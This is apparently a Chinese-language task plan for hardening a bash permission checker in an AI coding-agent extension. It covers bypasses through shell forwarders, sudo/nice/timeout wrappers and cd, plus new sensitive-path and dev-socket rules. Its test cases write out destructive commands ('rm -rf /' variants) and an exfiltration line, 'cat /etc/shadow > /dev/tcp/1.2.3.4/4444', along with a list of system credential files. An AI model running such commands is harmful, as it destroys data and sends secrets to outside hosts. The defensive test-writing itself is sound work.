# tasks.md — bash-hardening-round-2

## 关键链标注

**关键链（CC）**：`0.1 → 0.2 → 1.1 → 1.2 → 2.1 → 2.2 → 3.1 → 3.2 → 4.1 → 4.2 → 5.1 → 5.2 → 6.1`

**支流链（非关键，可并行）**：
- L4a 敏感规则表扩展（3.x）：与 L3（2.x）无依赖，可并行
- L4b dev-socket 决策分支（4.x）：与 L3（2.x）无依赖，可并行
- extensions/index.ts 的 `cd_chdir` 分支（5.x）：依赖 L3 完成（2.x），但不依赖 L4a/L4b

**并行窗口**：在 L1+L2 完成（1.2）之后，L3 / L4a / L4b 三条链可并行推进（各自 RED→GREEN→REFACTOR）。

**关键链诊断**：本次 change 的关键链不是单一任务序列，而是"安全回归探针先建立 → 四个修复点按依赖顺序实现 → 集成层同步 → 全量回归"的序列。buffer 留在最后一步（6.1 全量回归）——这是"集成测试 buffer"，覆盖跨分系统整合后的不确定性。

**Project buffer（tier-medium 35%）**：
- 关键链预估 6 人时（0.1–6.1 各任务累加，不含 buffer）
- Buffer 比例 35%（tier-medium 查表 1 critical-buffer 行）= **2.1 人时**
- Buffer 落位：6.1 全量回归之后留 2.1 人时用于跨分系统整合后的不确定性修复（如 L3 与既有 `for` 循环豁免的边界冲突、L4b 与既有 sensitive fallback 的顺序问题）

**任务主体约束**：所有任务主体均为编程性动作（写测试 / 写代码 / 跑命令 / 改配置）。非编程性动作（如"人工目测弹窗文案"）已降级为对应任务的 `验证` 字段。

## 0. 准备与回归基线

- [x] 0.1 建立安全回归基线：在 `test/security-probe.mjs` 中追加 L1/L2/L3 三类绕过 payload（`bash --posix -c 'rm -rf /'`、`sudo bash -c 'rm -rf /'`、`cd /etc && rm -rf .` 等共 12 个用例），运行 `node --experimental-strip-types test/security-probe.mjs` 确认当前实现下这些用例全部 FAIL（RED 阶段）。**验证**：探针输出 35 PASS + 12 FAIL，exit code 1
- [x] 0.2 建立决策层敏感路径回归基线：在 `test/sensitive.test.ts` 追加 `/etc/shadow`、`/etc/sudoers`、`/etc/master.passwd`、`/etc/crontab`、`/etc/cron.d/*`、`/etc/hosts.allow` 六个用例，在 `test/decision.test.ts` 追加 `/dev/tcp/1.2.3.4/4444`、`/dev/udp/attacker.com/53`、`/dev/fd/3` 三个写入用例与 `/etc/passwd`、`/etc/hosts` 两个反例，运行 `npm test` 确认新增用例全部 FAIL（RED 阶段）。**验证**：测试套件输出 538 PASS + 新增 11 个用例 FAIL

## 1. L1 修复：shell 转发器长参数前缀（关键链）

- [x] 1.1 修改 `src/lib/bash-extract.ts` 的 `isShellForwarderTokenStream`：`SHELL_NAMES` 分支的参数扫描循环中，将 `if (arg.startsWith("--")) break;` 改为 `continue`，使长参数被跳过后继续扫描后续参数以捕获 `-c` / 选项簇 / 脚本路径。**验证**：`bash --posix -c 'rm -rf /'` 被分类为 `unreliable`（reason: `shell_forwarder`）
- [x] 1.2 在 `test/security-probe.mjs` 追加 4 个 L1 用例（`bash --posix -c`、`bash --norc -c`、`bash --noprofile -c`、`sh --posix -c`）与 2 个反例（`bash --version` 应静默、`bash --help` 应静默），运行探针确认全部 PASS。**验证**：探针输出 49 PASS + 0 FAIL，exit code 0

## 2. L2 修复：外层包装器识别（关键链）

- [x] 2.1 修改 `src/lib/bash-extract.ts`：向 `SHELL_WRAPPER_NAMES` 常量集合追加 `sudo`、`nohup`、`timeout`、`watch`、`nice` 五个外层包装器名；修改 `skipWrapperTokens` 函数，**显式**为 `timeout` 与 `nice` 增加取值 flag 识别——`timeout` 的第一个位置参数（持续时间，如 `5`、`1m`、`1h`）被消费后继续扫描；`nice` 的 `-n LEVEL` 形式被识别为"取值短 flag + 值"消费 2 个 token。**关键陷阱**：当前 `skipWrapperTokens` 的"其他短 flag"分支（line 2927 `i += 1; continue`）不识别 `-n` 为取值 flag，只消费 1 个 token，导致 `LEVEL`（如 `10`）被当位置参数 break——若不加显式处理，`nice -n 10 bash -c '...'` 会静默放行。**验证**：`sudo bash -c 'rm -rf /'`、`nohup bash /tmp/x.sh`、`timeout 5 bash -c '...'`、`timeout 1m bash -c '...'`、`watch bash -c '...'`、`nice -n 10 bash -c '...'` 均被分类为 `unreliable`（reason: `shell_forwarder`）
- [x] 2.2 在 `test/security-probe.mjs` 追加 7 个 L2 用例（5 个基本包装器形式 + `sudo env bash -c` 组合形式 + `timeout 1m bash -c` 持续时间变体），运行探针确认全部 PASS。**验证**：探针输出 56 PASS + 0 FAIL，exit code 0

## 3. L3 修复：cd cwd 变更判不可靠（关键链）

- [x] 3.1 在 `src/lib/bash-extract.ts` 新增 `scanCdChdir(cmd: string): string | undefined` 函数：按 `;`、`&&`、`||`、`&`、`\n` 分隔复合命令，若任一片段的首个 token（basename，去掉路径前缀）为 `cd` 则返回 `"cd_chdir"`，否则返回 `undefined`；单命令 `cd`（无分隔符）不触发。**验证**：`cd /etc && rm -rf .` 返回 `"cd_chdir"`；`cd /etc` 返回 `undefined`；`echo hi; cd /tmp && rm -rf .` 返回 `"cd_chdir"`
- [x] 3.2 修改 `src/lib/bash-extract.ts` 的 `extractBashTargets`：在 `scanControlFlow` 之后、`isShellForwarder` 之前插入 `scanCdChdir` 检查，返回 `unreliable` 时短路为 `{ reliable: false, reason: "cd_chdir" }`。**验证**：`cd /etc && rm -rf .` 整条命令被判 unreliable
- [x] 3.3 在 `test/security-probe.mjs` 追加 6 个 L3 用例（`cd /etc && rm -rf .`、`cd /etc && ls`、`cd src && cat a.txt | sort`、`echo hi; cd /tmp && rm -rf .`、`cd .. && ls`、`cd - && ls`）与 1 个反例（单命令 `cd /etc` 应静默），运行探针确认全部 PASS。**验证**：探针输出 63 PASS + 0 FAIL，exit code 0

## 4. L4a 修复：系统机密文件敏感规则（支流链，与 3.x 并行）

- [x] 4.1 在 `src/lib/sensitive.ts` 的 `DEFAULT_SENSITIVE_RULES` 数组尾部追加一条新规则：test 函数匹配 `/etc/shadow`、`/etc/sudoers`、`/etc/master.passwd`、`/etc/crontab`、`/etc/cron.d/*`、`/etc/cron.hourly/*`、`/etc/cron.daily/*`、`/etc/cron.weekly/*`、`/etc/cron.monthly/*`、`/etc/hosts.allow`、`/etc/hosts.deny`（用 basename 精确匹配 + 目录前缀匹配组合），reason 字段为 `"System credential/config file"`。**验证**：`findSensitiveMatch("/etc/shadow")` 返回 truthy 且 reason 为 `"System credential/config file"`；`findSensitiveMatch("/etc/passwd")` 返回 `undefined`；`findSensitiveMatch("/etc/hosts")` 返回 `undefined`
- [x] 4.2 在 `test/sensitive.test.ts` 追加 11 个用例（6 个正向 `/etc/shadow` 等 + 5 个反例 `/etc/passwd`、`/etc/hosts`、`/etc/hostname`、`/etc/group`、`/etc/nsswitch.conf`），运行 `npm test` 确认全部 PASS。**验证**：测试套件输出 549 PASS + 0 FAIL（原 538 + 新增 11）

## 5. L4b 修复：dev-socket 写入强制 tier=two（支流链，与 3.x 并行）

- [x] 5.1 修改 `src/lib/decision.ts`：在 `decide()` 函数的敏感路径 fallback 分支（`if (sensitive) { ... }`）之前插入 dev-socket 写入检查——`if (action === "write" && isDevSocketOrFd(absPath)) return { kind: "prompt", tier: "two", declaration: "unconfigured", configured: false, reason: "Network exfiltration path: " + absPath }`；从 `./bash-extract.ts` import `isDevSocketOrFd`。**验证**：`decide({absPath: "/dev/tcp/1.2.3.4/4444", action: "write", ...})` 返回 `prompt` / `tier: "two"`；`decide({absPath: "/dev/tcp/1.2.3.4/4444", action: "read", ...})` 返回 `auto_allow`（读取不拦截）；`decide({absPath: "/tmp/out.txt", action: "write", ...})` 按既有规则处理（不受影响）
- [x] 5.2 在 `test/decision.test.ts` 追加 5 个用例（3 个正向 `/dev/tcp/*`、`/dev/udp/*`、`/dev/fd/3` 写入 + 1 个反例 `/dev/tcp/*` 读取不拦截 + 1 个反例 `/tmp/out.txt` 写入按既有规则），运行 `npm test` 确认全部 PASS。**验证**：测试套件输出 554 PASS + 0 FAIL（原 549 + 新增 5）

## 6. extensions 集成层同步与全量回归

- [x] 6.1 修改 `extensions/index.ts` 的 `bashPermissionForReason` 与 `bashSubtitleForReason`：在 switch 里增加 `cd_chdir` 分支，返回 `read_write` 权限与合适的提示文案（如"该命令包含 cd 命令，改变后续命令的工作目录，无法静态确定实际访问的文件路径。建议使用绝对路径或选择「会话内允许」避免重复弹窗"）。**验证**：`cd_chdir` reason 在 `bashPermissionForReason` 中返回 `"read_write"`；在 `bashSubtitleForReason` 中返回非空提示文案
- [x] 6.2 全量回归：运行 `npm test` 确认测试套件全部 PASS；运行 `node --experimental-strip-types test/security-probe.mjs` 确认探针全部 PASS；运行 `grep -n "bash --posix\|sudo bash\|cd /etc && rm" test/ src/ extensions/` 确认无遗漏。**验证**：测试套件 554 PASS + 0 FAIL；探针 63 PASS + 0 FAIL；grep 输出符合预期

- [x] 6.3 新增 `test/approval-flow.test.ts` 与 `test/grant-memory.test.ts`，覆盖 `bashSubtitleForReason`（`extensions/index.ts:193`）与 `bashPermissionForReason`（`extensions/index.ts:159`）的 `cd_chdir` case 分支——两个函数当前在测试目录无覆盖，scenario-test-map.md 中 AF-CDC-01/02 与 GM-CDC-01 三个 N/A scenario 由本任务转为可执行测试面。**验证**：`test/approval-flow.test.ts` 含 `bashSubtitleForReason("cd_chdir")` 返回含"cd 命令"与"会话内允许"字样的断言；`test/grant-memory.test.ts` 含 `bashPermissionForReason("cd_chdir")` 返回 `"read_write"` 的断言；`npm test` 全部 PASS（含新增 3 个 test）

## 7. Buffer 缓冲（关键链尾部）

- [x] 7.1 跨分系统整合验证：手动构造以下边界用例，运行 `extractBashTargets` 与 `decide` 确认行为符合预期——`cd /etc && rm -rf .` 应判 `cd_chdir`（不是 `shell_forwarder`）；`sudo bash --posix -c 'rm -rf /'` 应判 `shell_forwarder`（L1+L2 叠加）；`cd /etc && echo x > /dev/tcp/1.2.3.4/4444` 应判 `cd_chdir`（不是 `shell_forwarder`）；`cat /etc/shadow > /dev/tcp/1.2.3.4/4444` 应判 `shell_forwarder` 之外（两个 sensitive target 都走 decision 层 tier=two）。**验证**：4 个边界用例的行为与预期一致，无冲突
  - **执行记录**（`test/cross-system-boundary.mjs`）：7.1a/b/c/d-i/d-ii 全部通过；7.1d 对 `cat /etc/shadow > /dev/tcp/...` 的 3 个隐式 targets 分别决策——`read /etc/shadow` → prompt tier=two（sensitive default）、`write /dev/tcp/...` → prompt tier=two（Network exfiltration）、`read /dev/tcp/...` → auto_allow（L4b 明确不拦截 dev-socket 读取，符合 AD-DEV-04 与 design.md D5 理由）。全部 8 项 check 通过。

- [x] 7.2 Buffer 剩余时间处理：若 7.1 发现跨分系统冲突（如 L3 与 L2 的判定顺序冲突、L4a 与 L4b 的 tier 冲突），用剩余 buffer（预估 2.1 人时）修复。**验证**：所有冲突修复后，`npm test` 与探针仍全部 PASS
  - **执行记录**：7.1 未触发跨分系统冲突（L3 vs L2 的判定顺序按 design D3 与 D1 一致、L4a vs L4b 的 tier 分配按各自规则独立、shell_forwarder vs cd_chdir 的 reason 优先级由 extractBashTargets 顺序保证）。Buffer 未消耗。
